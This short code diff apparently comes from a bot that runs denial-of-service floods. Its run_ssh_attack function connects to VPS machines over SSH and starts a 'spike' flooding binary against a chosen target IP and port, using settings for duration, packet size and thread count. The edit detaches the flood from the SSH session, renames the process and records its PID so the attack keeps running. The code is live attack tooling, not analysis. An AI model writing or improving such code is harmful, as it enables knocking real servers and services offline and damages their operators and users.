@@ -528,7 +528,7 @@ async def run_ssh_attack(vps_data, target_ip, port, duration, chat_id, context, 
                 )
 
             # ✅ Run attack command in background to avoid SSH closing early
-            command = f"setsid nohup ./spike {target_ip} {port} {duration} {pkt_size} {thread_count} > attack.log 2>&1 & disown"
+            command = f"nohup bash -c 'exec -a spike ./spike {target_ip} {port} {duration} {pkt_size} {thread_count}' > attack.log 2>&1 & echo $! > attack_pid.txt && disown"
             result = await conn.run(command, check=False)
             logger.info(f"Executing command on {vps_data['ip']}: {command}")
         
